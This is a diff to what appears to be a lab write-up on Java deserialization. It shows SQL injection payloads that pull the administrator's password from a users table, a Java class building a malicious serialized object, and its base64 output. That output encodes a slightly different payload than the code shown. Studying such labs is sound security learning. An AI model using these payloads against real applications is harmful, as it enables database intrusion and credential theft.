@@ -267,6 +267,44 @@ private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundE
 }
 
 ```
+* Looking at this code, I started tooling with creating a malicious ProductTemplate object with SQL injection. At first, I was thinking we could just use stacked queries divided by a semicolon, but in Java, we cannot do that ... so we must do union attack with the `id` input ... well, after a cascade of `java.io.IOException: org.postgresql.util.PSQLException: ERROR: each UNION query must have the same number of columns`, I finally got to a different error with `"' UNION SELECT NULL,password,NULL,NULL,NULL,NULL,NULL,NULL FROM users WHERE username='administrator' --"`, but the error was `Java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser`. A ClassCastException is thrown when the code has attempted to cast an object to a subclass of which it is not an instance.
+* This also works: `("' || CAST((SELECT password FROM users LIMIT 1) AS int) --");`. 
+
+**FINAL MAIN.JAVA**
+```
+import data.productcatalog.ProductTemplate;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.io.Serializable;
+import java.util.Base64;
+
+class Main {
+    public static void main(String[] args) throws Exception {
+        ProductTemplate originalObject = new ProductTemplate("' || (SELECT password FROM users LIMIT 1)::integer --");
+
+        String serializedObject = serialize(originalObject);
+
+        System.out.println("Serialized object: " + serializedObject);
+
+    }
+
+    private static String serialize(Serializable obj) throws Exception {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
+        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
+            out.writeObject(obj);
+        }
+        return Base64.getEncoder().encodeToString(baos.toByteArray());
+    }
+}
+```
+```
+lazas@lazas-linux-ctop:~/IdeaProjects/java_deserialization.java/src$ javac data/productcatalog/ProductTemplate.java Main.java
+lazas@lazas-linux-ctop:~/IdeaProjects/java_deserialization.java/src$ java Main
+Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAOScgfHwgQ0FTVCgoU0VMRUNUIHBhc3N3b3JkIEZST00gdXNlcnMgTElNSVQgMSkgQVMgaW50KSAtLQ==
+```
+**Source Code**
 ```
 package data.productcatalog;
 
